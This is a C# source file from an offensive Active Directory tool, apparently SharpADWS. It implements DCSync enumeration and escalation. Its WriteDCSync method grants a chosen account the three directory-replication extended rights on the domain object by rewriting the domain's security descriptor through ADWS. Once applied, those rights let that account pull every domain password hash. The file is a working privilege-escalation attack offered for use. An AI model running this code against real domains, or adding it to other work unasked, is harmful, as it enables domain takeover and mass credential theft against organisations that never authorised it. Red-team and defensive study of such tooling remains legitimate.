using SharpADWS.ADWS.Enumeration;
using SharpADWS.ADWS;
using System;
using SharpADWS.Methods.ACL;
using System.Collections.Generic;
using SharpADWS.ADWS.Transfer;
using System.DirectoryServices.Protocols;
using System.DirectoryServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceModel.Channels;

namespace SharpADWS.Methods
{
    internal class DCSync
    {
        private ADWSConnection adwsConnection = null;
        private string DefaultNamingContext = null;

        public DCSync(ADWSConnection adwsConnection)
        {
            this.adwsConnection = adwsConnection;
            this.DefaultNamingContext = adwsConnection.DefaultNamingContext;
        }

        public void FindDCSync()
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(this.adwsConnection);
            List<ADObject> userObjects = enumerateRequest.Enumerate("(objectClass=domain)", this.DefaultNamingContext, "subtree", new string[] { "distinguishedName", "nTSecurityDescriptor" });

            Console.WriteLine();

            foreach (ADObject userObject in userObjects)
            {
                if (userObject.Class == "domaindns")
                {
                    ACLParser aclParser = new ACLParser(userObject.NTSecurityDescriptor, userObject, null, "ExtendedRight", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2", 0, null);
                    aclParser.Parse();
                }
            }
        }

        public void WriteDCSync(string sAMAccountName)
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(this.adwsConnection);
            List<ADObject> adObjects = enumerateRequest.Enumerate($"(ObjectClass=*)", this.DefaultNamingContext, "base", new string[] { "distinguishedName", "NTSecurityDescriptor" });

            Console.WriteLine();

            if (adObjects.Count == 0)
            {
                Console.WriteLine("[-] Account to escalate does not exist!");
                return;
            }

            foreach (ADObject adObject in adObjects)
            {
                if (adObject.Class == "domaindns")
                {
                    List<string> rightsGuidList = new List<string>
                    {
                        "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2", 
                        "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2", 
                        "89e95b76-444d-4c62-991a-0facbeda640c"
                    };

                    string objectSid = ReadObjectSid(sAMAccountName);

                    ActiveDirectorySecurity activeDirectorySecurity = adObject.NTSecurityDescriptor;

                    foreach(var rightsGuid in rightsGuidList)
                    {
                        activeDirectorySecurity.AddAccessRule(CreateDCSyncAce(objectSid, rightsGuid));
                    }

                    PutRequest putRequest = new PutRequest(adwsConnection);
                    Message modifyResponse = putRequest.ModifyRequest(adObject.DistinguishedName, DirectoryAttributeOperation.Replace, "nTSecurityDescriptor", activeDirectorySecurity.GetSecurityDescriptorBinaryForm());

                    if (!modifyResponse.IsFault)
                    {
                        Console.WriteLine($"[*] Account {sAMAccountName} now has DCSync privieges on the domain.");
                    }
                    else
                    {
                        Console.WriteLine($"[-] Elevating {sAMAccountName} with DCSync privileges failed.");
                    }
                }
            }
        }

        private string ReadObjectSid(string sAMAccountName)
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(adwsConnection);
            List<ADObject> adObjects = enumerateRequest.Enumerate($"(&(objectClass=*)(sAMAccountName={sAMAccountName}))", adwsConnection.DefaultNamingContext, "subtree", new string[] {
                "objectSid"
            });

            foreach (ADObject adObject in adObjects)
            {
                if (adObject.ObjectSid != null)
                {
                    return adObject.ObjectSid.ToString();
                }
            }
            return null;
        }

        private ActiveDirectoryAccessRule CreateDCSyncAce(string objectSid, string rightsGuid)
        {
            SecurityIdentifier sid = new SecurityIdentifier(objectSid);
            ActiveDirectoryAccessRule adRule = new ActiveDirectoryAccessRule(sid, ActiveDirectoryRights.ExtendedRight, AccessControlType.Allow, new Guid(rightsGuid));
            return adRule;
        }
    }
}
